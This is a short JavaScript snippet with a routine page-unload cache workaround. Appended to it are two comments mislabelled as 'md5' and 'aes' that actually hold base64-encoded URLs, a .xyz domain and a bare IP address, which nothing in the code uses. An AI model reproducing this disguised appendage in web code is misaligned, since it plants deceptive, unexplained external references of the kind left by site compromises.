if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuYW5kY3FlYmgueHl6L2luZGV4L2luZGV4L2hvbWUuaHRtbA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/